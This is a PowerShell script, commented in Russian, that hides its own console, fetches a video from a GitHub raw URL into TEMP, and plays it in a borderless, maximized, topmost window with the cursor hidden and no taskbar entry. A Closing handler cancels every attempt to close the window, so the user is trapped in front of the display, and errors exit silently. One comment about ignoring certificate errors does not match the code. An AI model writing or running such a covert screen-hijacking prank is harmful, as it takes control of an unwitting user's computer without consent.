# 1. Скрываем консоль
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# 2. ПРАВИЛЬНАЯ ССЫЛКА НА ВИДЕО
# Проверь, что в репозитории файл лежит в папке assets и называется edit.mp4
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'

# Генерация уникального имени
$name = [guid]::NewGuid().ToString()
$f = "$env:TEMP\$name.mp4"

try {
    # Скачивание с игнорированием ошибок сертификатов
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    # Проверка: если файл скачался пустым (бывает при 404), выходим
    if ((Get-Item $f).Length -lt 100) { exit }

    # XAML Интерфейс
    [xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader $xaml
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    $v.add_MediaEnded({ $w.Close() })
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} 
catch {
    # Если 404 или ошибка сети — тихо выходим
    exit
}
finally {
    # Удаление видео после просмотра
    Start-Sleep -Seconds 1
    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
}
